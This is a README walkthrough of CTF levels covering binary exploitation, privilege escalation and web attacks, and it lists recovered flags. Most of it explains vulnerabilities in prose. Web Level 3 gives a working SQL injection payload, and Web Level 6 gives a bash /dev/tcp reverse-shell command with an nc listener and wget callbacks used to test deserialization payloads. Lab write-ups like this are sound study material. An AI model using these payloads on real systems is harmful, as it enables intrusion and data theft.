# CTF Walkthrough

This README serves as an overview of each level's solution in the CTF. The detailed exploits and code can be found within the respective subdirectories for each category and level.

The solutions provided detail the vulnerabilities discovered, the process of exploitation, and the obstacles that had to be overcome at each level. This information can be valuable for understanding not just "what" the solutions are, but "why" they work and "how" they were arrived at.

I hope this guide is helpful for anyone looking to understand more about these types of vulnerabilities and the methods used to exploit them. Enjoy exploring, learning, and happy hacking!

## Binary Exploitation

### Level 1

**Solution**: The challenge here was pretty straightforward. The goal was to use a symlink and redirect `~` to the PATH.

### Level 2

**Solution**: The key to this level was to fuzz the `choice` function. Here's the step-by-step solution:

1. Input "1234". The program returned an "invalid input: 210" error.
2. Noticing the 210, I deduced that this could be an integer overflow since 1234 mod 1024 = 210.
3. After running the choice function again with an input of "1027" (since that's 3 modulo 1024), a shell was opened.
4. On further examination of the code, I identified that the integer does indeed overflow after 256.

### Level 3

**Solution**: The vulnerability exploited here lies in the reading of the username from user input. Here's how it was done:

1. When reading the username, the `get_string_from_user()` function mistakenly writes to the password buffer while using `USERNAME_BUFFER_SIZE`, causing an overflow.
2. Conveniently, the address of the function used for checking the credentials (`test_authenticate_admin`) is placed and called on the stack within the range we can overwrite with this overflow.
3. We can simply replace the address with the address of `test_start_admin_console`, which we find with `gdb` (> info address `test_start_admin_console`) = 0x4012ee.
4. We examined the assembly code to determine the amount of padding needed to get from the password buffer to the pointer to `test_authenticate_admin`.
5. We found that 0x40(%rsp) is the location of the buffer and 0x78(%rsp) is the location of the pointer. 0x78 - 0x40 = 0x38 = 3*16 +8 = 56.

### Level 4

**Solution**: The key steps were:

1. Start the echo service, which is vulnerable to a brute force attack since it's a fork server.
2. Cause a buffer overflow with a canary and redirect to `admin_console()`, then enter `l33t`.

Some obstacles along the way included:

- Realizing that brute force was the right approach took a while.
- Adding the address of `admin_console` right after the canary, forgetting about the frame pointer between the canary and the return address.
- Returning to the `admin_console()` address did not work. I had to return to a higher address, skipping one or two lines of assembly instructions.
- Realizing that the shell is opened in the running `echo_service` process and that I simply had to enter `l33t` there.

## Privilege Escalation

### Level 1

**Solution**: Upon reading the source code, I noticed a call to `~/.secret`.

1. I surmised that `~` is defined by the HOME variable in the environment.
2. Changing the HOME variable to the directory where the secret was stored made the program diff `.secret` with itself. This returned exit code 0, which gave me a shell.

### Level 2

**Solution**: The binary allows execution of commands with level 2 privileges (gid), but it's intended to be used only in `/devel/bin`. 

1. This can easily be bypassed using "../../".
2. Find the `l33t` command using `whereis`.
3. Run the `l33t` command as `group2`.

### Level 

3

**Solution**: The vulnerability lies in `strcpy`, which doesn't check if the source is larger than the target. Here's the exploit process:

1. The `strcpy` function occurs after the security checks, meaning we can bypass the check if the accessed binary is in the right directory and within our permissions.
2. We pretend to want to access `uniq`, then overflow `l33t` into the filename buffer from the argument buffer.

### Level 4

**Solution**: There's an off-by-one error in `safecpy`, allowing us to join `user` and `host` into one string, not separated by any null bytes.

1. The buffer for `greeting` is only 160 characters long, and it overflows if we fill it with one of these joined host/user names.
2. We can thus overwrite the return address.
3. Load shellcode into the environment and redirect the return address to it.
4. Open a shell, but executing `l33t` did not yield the desired result.
5. Execute the `l33t` command directly, instead of opening a shell.

## Web Exploitation

### Level 1

**Solution**: The key was realizing that PHP would interpret the hash starting with "0e" and consisting only of numerals as a float.

1. I wrote a Python script iterating through numbers to attach to the prefix until the hash fit the regular expression "^0e[ 0-9]*$".
2. Found "My lucky number is 161614089".
3. Flag: flag{2fCeHg649Oa1baQA}

### Level 2

**Solution**: Took some time to find the binary under /data.

1. Decompiled it with Ghidra.
2. Found that the first usage XORed the input with a string and compared the result to another string. XORed those two strings and got "admin" interpreted in ASCII.
3. Second use of the function was obviously checking the password: 0a677ebfe9eaccdcb878e9d219142b9d.
4. Flag: flag{IO7eRAhsbe7YKyAl}

### Level 3

**Solution**: Tried to inject all fields on the website.

1. Successful on username.
2. Tried to find out things about the user table and found it had a password column.
3. Iteratively guessed the password of tsutomu by using the LEFT() function in the injected query.
4. Result: ' OR LEFT(password,31) ='kevinmitnickisanarrogantbastard' -- -
5. Logged in as tsutomu and found the flag in his private blog.
6. Flag: flag{ir1kvKKvuX9CmmlS}

### Level 4

**Solution**: Vulnerable to Padding Oracle attack.

1. Found .hidden.txt by intercepting the packet with Burp Suite.
2. Got Burp Suite padding oracle hunter to work after lots of tries.
3. Flag: flag{JIp6XtSmWvisOFqz}

### Level 5

**Solution**: Recognized that it was a hash length extension attack fairly quickly.

1. Wrote a Python script using hashpump to extend the hashes.
2. Started looking around for which file to actually request.
3. Found .hidden.txt mentioned.
4. Was only successful when I brute-forced password length. Password was 39 long and not 30 as mentioned on the website.
5. Flag: flag{gMyWh8fcfhjhWw5K}

### Level 6

**Solution**: In this level, we exploited a Deserialization vulnerability, which involved a more complex process compared to previous levels:

1. Identified that this was the only service issuing a cookie.
2. Decoded the cookie using Base64 and discovered hints of a password and username.
3. Recognized the need for a deserialization attack, and used `ysoserial` to generate a payload.
4. Set up a DNS server to track DNS requests and tested the attack.
5. Identified working `ysoserial` payloads by testing them using wget to a webhook URL, appending the payload name for identification.
6. Encountered challenges in achieving a reverse shell, requiring the use of a modified version of `ysoserial`.
7. Command used for the reverse shell: "bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1". Listened with: nc -lvnp port
8. Navigated through server permissions to find the flag, which was found using the command: cat /var/websec/wwwstudent_43/level06/flag.txt
9. Flag: tomcat{wmfmRzJpzLtiz7a1}

### Level 7

**Solution**: In this level, an XML External Entity (XXE) vulnerability was exploited.

1. Identified the vulnerability as XML External Entity (XXE).
2. Uploaded an SVG that incorporates the file mentioned in the admin bio using a standard SVG payload from "Payload All The Things".
3. Experienced difficulties with padding. Wrote a Python script to iterate through the lorem ipsum a few pixels at a time.
4. Carefully examined the output pictures and eventually found the flag.
5. Flag: wsgi{FEKCCZcwYidfAurg}
